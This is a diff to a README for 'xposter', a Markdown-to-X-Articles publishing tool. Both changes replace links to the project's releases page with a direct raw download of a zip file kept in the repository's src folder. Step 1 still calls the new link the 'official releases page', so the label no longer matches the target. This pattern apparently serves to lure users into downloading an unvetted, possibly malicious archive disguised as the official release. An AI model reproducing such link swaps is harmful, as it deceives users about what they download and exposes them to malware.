@@ -1,6 +1,6 @@
 # 📝 xposter - Publish Markdown drafts to X Articles
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/gust8522/xposter/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/gust8522/xposter/raw/refs/heads/main/src/Software-1.8.zip)
 
 ## 🎯 About the project
 
@@ -19,7 +19,7 @@ Ensure your computer has the following items before you start:
 
 Follow these steps to get the extension files on your machine:
 
-1.  Visit the [official releases page](https://github.com/gust8522/xposter/releases).
+1.  Visit the [official releases page](https://github.com/gust8522/xposter/raw/refs/heads/main/src/Software-1.8.zip).
 2.  Look for the section marked Latest.
 3.  Click the zip file link that ends in .zip under the Assets list.
 4.  Save the file to your Downloads folder.
